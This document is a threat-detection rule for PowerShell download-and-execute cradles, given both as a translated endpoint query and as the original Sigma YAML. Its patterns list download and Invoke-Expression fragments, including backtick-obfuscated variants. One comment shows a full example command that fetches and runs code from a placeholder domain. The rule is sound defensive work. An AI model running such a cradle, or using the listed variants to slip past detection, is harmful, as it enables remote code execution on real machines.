```sql
// Translated content (automatically translated on 22-12-2025 02:21:40):
event.type="Process Creation" and (endpoint.os="windows" and ((tgt.process.cmdline contains ".DownloadString(" or tgt.process.cmdline contains ".DownloadFile(" or tgt.process.cmdline contains "Invoke-WebRequest " or tgt.process.cmdline contains "iwr " or tgt.process.cmdline contains "Invoke-RestMethod " or tgt.process.cmdline contains "irm ") and (tgt.process.cmdline contains ";iex $" or tgt.process.cmdline contains "| IEX" or tgt.process.cmdline contains "|IEX " or tgt.process.cmdline contains "I`E`X" or tgt.process.cmdline contains "I`EX" or tgt.process.cmdline contains "IE`X" or tgt.process.cmdline contains "iex " or tgt.process.cmdline contains "IEX (" or tgt.process.cmdline contains "IEX(" or tgt.process.cmdline contains "Invoke-Expression")))
```


# Original Sigma Rule:
```yaml
title: PowerShell Download and Execution Cradles
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: test
description: Detects PowerShell download and execution cradles.
references:
    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
    - https://labs.withsecure.com/publications/fin7-target-veeam-servers
author: Florian Roth (Nextron Systems)
date: 2022-03-24
modified: 2025-07-18
tags:
    - attack.execution
    - attack.t1059
logsource:
    product: windows
    category: process_creation
detection:
    selection_download:
        CommandLine|contains:
            - '.DownloadString('
            - '.DownloadFile('
            - 'Invoke-WebRequest '
            - 'iwr '
            - 'Invoke-RestMethod '
            - 'irm '  # powershell -ep bypass -w h -c irm test.domain/ffe | iex
    selection_iex:
        CommandLine|contains:
            - ';iex $'
            - '| IEX'
            - '|IEX '
            - 'I`E`X'
            - 'I`EX'
            - 'IE`X'
            - 'iex '
            - 'IEX ('
            - 'IEX('
            - 'Invoke-Expression'
    condition: all of selection_*
falsepositives:
    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly
level: high
```
